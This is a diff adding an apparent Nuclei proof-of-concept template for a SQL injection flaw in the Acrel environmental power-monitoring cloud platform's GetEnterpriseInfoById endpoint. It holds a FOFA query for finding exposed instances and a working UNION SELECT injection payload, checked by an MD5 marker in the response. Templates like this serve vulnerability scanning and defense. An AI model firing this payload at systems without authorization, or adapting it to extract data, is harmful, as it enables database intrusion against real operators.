@@ -1,0 +1,30 @@
+id: poc-yaml-acreldny-getenterpriseinfobyid-sqli
+
+info:
+  name: 安科瑞环保用电监管云平台 GetEnterpriseInfoById SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 安科瑞环保用电监管云平台
+    fofa: body="myCss/phone.css"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/MainMonitor/GetEnterpriseInfoById?EnterpriseId=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%281%2Cmd5({{t1}})%2C0x7178767171%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "contains(content_type, 'application/json')"
+          - "contains(body, t2)"
+          - "contains(body, 'PicUrl')"
+          - "!contains(body, '<')"
